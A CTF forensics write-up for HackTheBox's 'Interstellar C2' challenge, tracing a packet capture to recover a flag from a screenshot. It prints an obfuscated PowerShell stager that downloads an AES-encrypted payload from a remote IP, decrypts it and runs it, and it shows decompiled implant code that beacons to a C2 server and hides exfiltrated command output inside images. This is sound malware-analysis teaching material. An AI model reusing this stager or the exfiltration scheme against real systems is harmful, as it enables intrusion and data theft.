# Challenge: Interstellar C2

## Category: Forensics

This challenge is part of the '_CyberApocalypse 2023_' CTF by Hackthebox, one of the hardest in the forensics category - difficulty **hard**.

A pcapng capture file 'capture.pcapng' was the the only provided input for the player. The goal is to understand what happened to retrieve the flag.

The very first step is look at the capture file using wireshark and get an very level summary:
```bash
wireshark capture.pcapng # open the file

# from Wireshark use Statistics -> File Properties
OS: 64-bit Windows 10 (21H2), build 19044
Packets 7269 7269 (100.0%)

# from Wireshark use Statistics -> Conversation IPv4
"192.168.25.140",0,"64.226.84.200",0,7202
```

At this point we know that the most part of the dialogue is between 192.168.25.140 and 64.226.84.200 as it involves 7202/7269 packets.

By looking at exported HTTP Objects ('File' -> 'Export Objects' -> 'HTTP') a powershell file was sent from 64.226.84.200 to 192.168.25.140 at the beginning fo the conversation,
packet 7, this can be a valid starting point.

The powershell file is a bit obfuscated and look like this:
```bash
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so')  ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ;  &("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3  ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte'));  .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle')  BI34  (  [TyPE]("{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}" -f 'TEm.secU','R','Y.CrY','IT','s','Y.','D','yS','pTogrAPH','E','CrypTOSTReAmmo'));  ${U`Rl} = ("{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"-f 'htt','4f0','53-41ab-938','d8e51','p://64.226.84.200/9497','8','58','a-ae1bd8','-','6')
${P`TF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.("{2}{1}{3}{0}"-f'ule','M','Import-','od') ("{2}{0}{3}{1}"-f 'r','fer','BitsT','ans')
.("{4}{5}{3}{1}{2}{0}"-f'r','-BitsT','ransfe','t','S','tar') -Source ${u`Rl} -Destination ${p`Tf}
${Fs} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{2}{0}"-f 'eam','IO.','FileStr')(${p`Tf},  ( &("{3}{1}{0}{2}" -f'lDIt','hi','eM','c')  ('VAria'+'blE'+':Q'+'L'+'z0sO')).VALue::"oP`eN")
${MS} = .("{3}{1}{0}{2}"-f'c','je','t','New-Ob') ("{5}{3}{0}{2}{4}{1}" -f'O.Memor','eam','y','stem.I','Str','Sy');
${a`es} =   (&('GI')  VARiaBLe:l60Yu3).VAluE::("{1}{0}" -f'reate','C').Invoke()
${a`Es}."KE`Y`sIZE" = 128
${K`EY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${a`ES}."K`EY" = ${K`EY}
${A`es}."i`V" = ${i`V}
${cS} = .("{1}{0}{2}"-f'e','N','w-Object') ("{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}" -f 'phy.Crypto','ptogr','ecuri','rea','Syste','S','m.S','m','t','ty.Cry','a')(${m`S}, ${a`Es}.("{0}{3}{2}{1}" -f'Cre','or','pt','ateDecry').Invoke(),   (&("{1}{2}{0}"-f 'ARIaBLE','Ge','T-V')  bI34  -VaLue )::"W`RItE");
${f`s}.("{1}{0}"-f 'To','Copy').Invoke(${Cs})
${d`ecD} = ${M`s}.("{0}{1}{2}"-f'T','oAr','ray').Invoke()
${C`S}.("{1}{0}"-f 'te','Wri').Invoke(${d`ECD}, 0, ${d`ECd}."LENg`TH");
${D`eCd} | .("{2}{3}{1}{0}" -f'ent','t-Cont','S','e') -Path "$env:temp\tmp7102591.exe" -Encoding ("{1}{0}"-f 'yte','B')
& "$env:temp\tmp7102591.exe"
```

With some work to get a more human readable script it becomes:
```bash
Set-iTem vAriAble:qLz0so [tYpe] -F SySTEM.io.FilEmode &set-VariABLE l60Yu3 [Type] sYStem.SeCuRiTY.crypTOgRAphY.aeS Set-VARiaBle BI34 sySTEm.secURITY.CrYpTogrAPHY.CrypTOSTReAmmoDE
$URL = "http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51" $PTF = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
Import-Module BitsTransfer 
Start-BitsTransfer -Source http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51 -Destination "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
New-Object IO.FileStream $PTF 
chilD-IteM VAriablE:QLz0sO.Value::Open
New-Object System.IO.MemoryStream
$AES = GI VARiaBLe:l60Yu3 Create.Invoke()
$AES.KEYSize = 128
$KEY = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0) #### fiAAEBAAABAQAAAQEAAQEAAA==
$iv = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)  #### AAEBAAAAAAEAAQEAAAEBAQ==
$AES."K`EY" = ${K`EY}
$AES."i`V" = ${i`V}
$CS = New-Object System.Security.Cryptography.CryptoStream $MS, $AES.CreateDecryptor.Invoke() GeT-VARIaBLE bI34::Write
CopyTo.Invoke($CS)
$DCED=$MS.ToArray.Invoke()
$CS=Write.Invoke($DCED, 0, DCED.Length)
$DCED | Set-Content -Path "$env:temp\tmp7102591.exe" - Encoding Byte
& "$env:temp\tmp7102591.exe"
```

Break it down very fast:
+ A CryptoStream object is created. This object involves AES-CBC to encrypt and decrypt the file content. KEY and IV are provided in the file and i put their base64 in comments
+ BitsTransfer is used to download a file '94974f08-5853-41ab-938a-ae1bd86d8e51' from 64.226.84.200
+ The downloaded content is decrypted and saved as tmp7102591.exe

We know the next step: find and decrypt this file from the conversation. This is fairly easy as we know the URL and the protocol - is packet 44.

A little jump forward as AES decryption will be present multiple times in this writeup: we have the decrypted exe file. 
The exe file is not obfuscated and can be decompiled by different tools such as ILSpy or JetBrains dotPeek, i used dotPeek. It's time  to decompile and read it.

But before that some words must be spent to understand what a C2 is.

---

Command and Control (C2) and from NIST definition:

_'Command and Control' is the exercise of authority and direction by a properly designated commander over assigned and attached forces in the 
accomplishment of the mission. Command and control functions are performed through an arrangement of personnel, equipment, communications, facilities, 
and procedures employed by a commander in planning, directing, coordinating, and controlling forces and operations in the accomplishment of the mission._

---

At this point i will report and try to summarize the main feature of this C2 that i'll call from the powershell script 'tmp7102591.exe'. 
A static analysis for me was enough to provide the information understand the capabilities and progress in the challenge.

### Primer()
Primer() function is one of the first invoked function. 
It's used to set program global variables by decrypting a base64 body that comes from "/Kettie/Emmie/Anni?Theda=Merrilee?c".
We can decrypt it as the KEY is hard-coded. The important variables are:
+ Key: a new base64 key that will be used to encrypt and the decrypt data over the entire flow
+ RandomURI/stringURLS: a list of strings and data that will be used to fake real communications
+ stringIMGS: list of images that will be used to hide command output in the communication

```java
private static void primer() {
    if (!(DateTime.ParseExact("2025-01-01", "yyyy-MM-dd", (IFormatProvider) CultureInfo.InvariantCulture) > DateTime.Now))
      return;
    Program.dfs = 0;
    string str1;
    try
    {
      str1 = WindowsIdentity.GetCurrent().Name;
    }
    catch
    {
      str1 = Environment.UserName;
    }
    if (Program.ihInteg())
      str1 += "*";
    string userDomainName = Environment.UserDomainName;
    string environmentVariable1 = Environment.GetEnvironmentVariable("COMPUTERNAME");
    string environmentVariable2 = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
    int id = Process.GetCurrentProcess().Id;
    string processName = Process.GetCurrentProcess().ProcessName;
    Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
    string input = (string) null;
    string baseURL = (string) null;
    foreach (string str2 in Program.basearray)
    {
      string un = string.Format("{0};{1};{2};{3};{4};{5};1", (object) userDomainName, (object) str1, (object) environmentVariable1, (object) environmentVariable2, (object) id, (object) processName);
      string key = "DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=";
      baseURL = str2;
      string address = baseURL + "/Kettie/Emmie/Anni?Theda=Merrilee?c";
      try
      {
        string enc = Program.GetWebRequest(Program.Encryption(key, un)).DownloadString(address);
        input = Program.Decryption(key, enc);
        break;
      }
      catch (Exception ex)
      {
        Console.WriteLine(string.Format(" > Exception {0}", (object) ex.Message));
      }
      ++Program.dfs;
    }
    string RandomURI = !string.IsNullOrEmpty(input) ? new Regex("RANDOMURI19901(.*)10991IRUMODNAR").Match(input).Groups[1].ToString() : throw new Exception();
    string stringURLS = new Regex("URLS10484390243(.*)34209348401SLRU").Match(input).Groups[1].ToString();
    string KillDate = new Regex("KILLDATE1665(.*)5661ETADLLIK").Match(input).Groups[1].ToString();
    string Sleep = new Regex("SLEEP98001(.*)10089PEELS").Match(input).Groups[1].ToString();
    string Jitter = new Regex("JITTER2025(.*)5202RETTIJ").Match(input).Groups[1].ToString();
    string Key = new Regex("NEWKEY8839394(.*)4939388YEKWEN").Match(input).Groups[1].ToString();
    string stringIMGS = new Regex("IMGS19459394(.*)49395491SGMI").Match(input).Groups[1].ToString();
    Program.ImplantCore(baseURL, RandomURI, stringURLS, KillDate, Sleep, Key, stringIMGS, Jitter);
  }
```

### ImplantCore()
A long function used to coordinate the C2 flow based on the incoming input over HTTP. Just a few code snippets commented by me are reported here. 
The C2 decrypt, parse and execute the provided cmd using an if-else condition. A new exe file appears in the flow: 'Core.exe'.


```java
Program.pKey = Key; // set the enc/decryption key from Primer()

cmd = Program.GetWebRequest((string) null).DownloadString(Program.UrlGen.GenerateUrl()); // read the HTTP request body
str1 = Program.Decryption(Key, cmd).Replace("\0", string.Empty); // decrypt and obtain the plaintext command

if (str1.ToLower().StartsWith("multicmd"))
          {
            string str2 = str1.Replace("multicmd", "");
            string[] separator = new string[1]
            {
              "!d-3dion@LD!-d" // multicmd separator
            };
            foreach (string input in str2.Split(separator, StringSplitOptions.RemoveEmptyEntries))
            {
            
            // different command options and execution paths
            /* - I.E.
            Assembly.Load(Convert.FromBase64String(Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase)));
            Program.Exec(stringBuilder1.ToString(), Program.taskId, Key);
            */
            
            }
else {
             Program.rAsm(string.Format("run-exe Core.Program Core {0}", (object) cmd));
             stringBuilder1.AppendLine(newOut.ToString());
             StringBuilder stringBuilder2 = newOut.GetStringBuilder();
             stringBuilder2.Remove(0, stringBuilder2.Length);
             if (stringBuilder1.Length > 2)
                Program.Exec(stringBuilder1.ToString(), Program.taskId, Key); 
             stringBuilder1.Length = 0;
            }         
```

### Exec() and GetImgData()
These two functions are very related. The first one - Exec() - take care of data such as the command output (cmdout) generated that can be generated by function like
Assembly.Load or Program.rAsm and call getImgData(). With getImgData() output perform a new HTTP call and sends back the cmdout to the malicious actor.

getImgData() part of ImgGen Class hides the encrypted cmdout in a image file. Take an images as buffer the final result will be:
```real_image|fill_with_RandomString until 1500 bytes|encrypted_cmdout```

```java
  public static void Exec(string cmd, string taskId, string key = null, byte[] encByte = null) {
    if (string.IsNullOrEmpty(key))
      key = Program.pKey;
    string cookie = Program.Encryption(key, taskId);
    byte[] imgData = Program.ImgGen.GetImgData(Convert.FromBase64String(encByte == null ? Program.Encryption(key, cmd, true) : Program.Encryption(key, (string) null, true, encByte)));
    int num = 0;
    while (num < 5)
    {
      ++num;
      try
      {
        Program.GetWebRequest(cookie).UploadData(Program.UrlGen.GenerateUrl(), imgData);
        num = 5;
      }
      catch
      {
      }
    }
  }
```

```java
  internal static class ImgGen {
    private static Random _rnd = new Random();
    private static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", RegexOptions.Compiled);
    private static List<string> _newImgs = new List<string>();

    internal static void Init(string stringIMGS) => Program.ImgGen._newImgs = Program.ImgGen._re.Matches(stringIMGS.Replace(",", "")).Cast<System.Text.RegularExpressions.Match>().Select<System.Text.RegularExpressions.Match, string>((Func<System.Text.RegularExpressions.Match, string>) (m => m.Value)).Where<string>((Func<string, bool>) (m => !string.IsNullOrEmpty(m))).ToList<string>();

    private static string RandomString(int length) => new string(Enumerable.Repeat<string>("...................@..........................Tyscf", length).Select<string, char>((Func<string, char>) (s => s[Program.ImgGen._rnd.Next(s.Length)])).ToArray<char>());

    internal static byte[] GetImgData(byte[] cmdoutput)
    {
      int num = 1500;
      int length = cmdoutput.Length + num;
      byte[] sourceArray = Convert.FromBase64String(Program.ImgGen._newImgs[new Random().Next(0, Program.ImgGen._newImgs.Count)]);
      byte[] bytes = Encoding.UTF8.GetBytes(Program.ImgGen.RandomString(num - sourceArray.Length));
      byte[] destinationArray = new byte[length];
      Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, sourceArray.Length);
      Array.Copy((Array) bytes, 0, (Array) destinationArray, sourceArray.Length, bytes.Length);
      Array.Copy((Array) cmdoutput, 0, (Array) destinationArray, sourceArray.Length + bytes.Length, cmdoutput.Length);
      return destinationArray;
    }
  }
}
```

### Encrypt()
Last but not the least compress the cmdout with gzip compressione and then ecnrypt it using AES.
```java
  private static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
  {
    byte[] numArray = unByte == null ? Encoding.UTF8.GetBytes(un) : unByte;
    if (comp)
      numArray = Program.Compress(numArray);
    try
    {
      SymmetricAlgorithm cam = Program.CreateCam(key, (string) null);
      byte[] second = cam.CreateEncryptor().TransformFinalBlock(numArray, 0, numArray.Length);
      return Convert.ToBase64String(Program.Combine(cam.IV, second));
    }
    catch
    {
      SymmetricAlgorithm cam = Program.CreateCam(key, (string) null, false);
      byte[] second = cam.CreateEncryptor().TransformFinalBlock(numArray, 0, numArray.Length);
      return Convert.ToBase64String(Program.Combine(cam.IV, second));
    }
  }
```

---

However, going back to practical solution. Using available information the next packet (after packet 44 that was the Implanter) must contain the variables for tmp7102591.exe.
And so it is. Found variables are (ouput cut for brevity):

```
RANDOMURI19901dVfhJmc2ciKvPOC10991IRUMODNAR
URLS10484390243"Kettie/Emmie/Anni?Theda=Merrilee", "Rey/Odele/Betsy/Evaleen/Lynnette?Violetta=Alie", ....
KILLDATE16652025-01-015661ETADLLIK
SLEEP980013s10089PEELS
JITTER20250.25202RETTIJ
NEWKEY8839394nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=4939388YEKWEN
IMGS19459394"iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAYFBMVEU1Njr/......
```

Using filter like "tcp.stream eq 5" or "tcp.stream eq 16" the player is able to recover and decrypt Core.exe but this part is skipped as is not mandatory to solve the challenge.
But still in my personal opinion read it and explore it as its interesting and provide a deeper understanding of this challenge.

The flow of the communication is:



After that image by image, for every command the player has to read, decrypt and explore what happened.

Fast forward to packet 6042 where the encrypted command is:
```y2TBZf7CIw8UGj+LY5/Sp6EVD5XaDKgw6Hk+rLjeewt6iWC3rHfg9XVsFBjFg1kUsP8sZ8a0jepdo7ssd9MI+A==``` that will be decrypted to ```¢¬Åmulticmd00036get-screenshot```,
this is the communication that hold the flag. The get-screenshot captured an image with a memo opened that has the flag.

http stream 27 sends the encrypted command and http stream 28 contains the image with cmdout.

I wrote a simple python3 script to retrieve the content after the image:
```python3
import base64

# to get 1500
open('file.saved','wb').write(ll[1500:]) # ll[len(l)+332:]
print(len(ll[1500:]), base64.b64encode(ll[1500:]))
```

Decrypt the base64 and then open the file and re-decode from base64
```bash
gzip -d archive.gz
cat archive | base64 -d > file.image; xdg-open file.image
```

---

Before disclosing the image with the flag an important note: **a lot of code reading from core.exe, taskId encrypted in the session cookie and many more steps about decryption,
null bytes handling etc... are overlooked for the sake of brevity**.

---

Now let's see the flag!!!










